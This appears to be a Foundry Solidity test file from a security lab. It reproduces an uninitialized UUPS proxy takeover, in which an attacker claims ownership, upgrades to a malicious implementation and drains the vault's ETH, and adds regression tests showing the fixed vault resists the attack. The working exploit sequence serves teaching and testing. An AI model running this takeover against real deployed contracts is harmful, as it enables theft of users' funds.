// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {Erc1967Proxy} from "../src/Erc1967Proxy.sol";
import {VulnerableUupsVault, EvilUupsImplementation} from "../src/VulnerableUupsVault.sol";
import {SafeUupsVault} from "../src/SafeUupsVault.sol";

/// @title UupsTakeover.t.sol
/// @notice Lab 14 — Exploit + regression tests for the uninitialized
///         UUPS proxy takeover.
///
/// Lab: Unguarded initializer on an upgradeable vault
///
/// Threat model:
///   The vault's `initialize()` has no one-shot guard, and the implementation
///   constructor does not lock its own storage. Deploying the proxy and
///   initializing it in separate transactions leaves a window — minutes or
///   forever — where `owner` is unset and `initialize` is callable by anyone.
///   A frontrunner or scanner becomes the owner, upgrades to arbitrary logic,
///   and drains the proxy.
///
/// Violated invariant:
///   "Privileged protocol state must be established exactly once, atomically
///   with deployment, by the deployer."
///
/// Reproduction (two-step deploy, empty init data):
///   1. Deploy proxy with EMPTY init data (the two-step mistake).
///   2. Fund the proxy with 10 ETH.
///   3. Attacker calls `initialize(attacker)` — succeeds, owner := attacker.
///   4. Attacker calls `upgradeToAndCall(evilImpl, drain(attacker))`.
///   5. The drain executes in the proxy's context: attacker holds 10 ETH.
///
/// Remediation (see SafeUupsVault):
///   An `initialized` flag makes the initializer one-shot, the constructor
///   locks the implementation's own storage, and the proxy is initialized
///   atomically in its creation transaction.
///
/// Regression tests:
///   The same attack against the safe deployment reverts at both steps, and
///   the raw implementation can never be initialized by anyone.
contract UupsTakeoverTest is Test {
    address internal deployer;
    address internal attacker;

    uint256 internal constant PROXY_FUNDING = 10 ether;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");
    }

    function testUninitializedProxyIsTakenOverAndDrained() public {
        VulnerableUupsVault impl = new VulnerableUupsVault();

        // The two-step mistake: proxy deployed with empty init data.
        vm.prank(deployer);
        Erc1967Proxy proxy = new Erc1967Proxy(address(impl), "");
        vm.deal(address(proxy), PROXY_FUNDING);

        // Attacker claims ownership in the open window.
        vm.prank(attacker);
        VulnerableUupsVault(payable(address(proxy))).initialize(attacker);

        EvilUupsImplementation evil = new EvilUupsImplementation();
        vm.prank(attacker);
        VulnerableUupsVault(payable(address(proxy)))
            .upgradeToAndCall(address(evil), abi.encodeCall(EvilUupsImplementation.drain, (payable(attacker))));

        assertEq(attacker.balance, PROXY_FUNDING, "proxy drained by attacker");
        assertEq(address(proxy).balance, 0);
    }

    function testVulnerableImplementationCanBeReinitialized() public {
        VulnerableUupsVault impl = new VulnerableUupsVault();

        // The implementation's own storage is also unguarded.
        vm.prank(attacker);
        impl.initialize(attacker);
        assertEq(impl.owner(), attacker);
    }

    function testSafeProxyInitializationIsAtomicAndLocked() public {
        SafeUupsVault impl = new SafeUupsVault();

        // Correct posture: initialize inside the creation transaction.
        vm.prank(deployer);
        Erc1967Proxy proxy = new Erc1967Proxy(address(impl), abi.encodeCall(SafeUupsVault.initialize, (deployer)));
        vm.deal(address(proxy), PROXY_FUNDING);

        // Takeover of the proxy fails: already initialized.
        vm.prank(attacker);
        vm.expectRevert();
        SafeUupsVault(payable(address(proxy))).initialize(attacker);

        // Takeover of the raw implementation fails: locked in its constructor.
        vm.prank(attacker);
        vm.expectRevert();
        impl.initialize(attacker);

        // Upgrade attempts by the attacker revert at the owner gate.
        EvilUupsImplementation evil = new EvilUupsImplementation();
        vm.prank(attacker);
        vm.expectRevert();
        SafeUupsVault(payable(address(proxy)))
            .upgradeToAndCall(address(evil), abi.encodeCall(EvilUupsImplementation.drain, (payable(attacker))));

        assertEq(address(proxy).balance, PROXY_FUNDING, "funds untouched");
    }
}
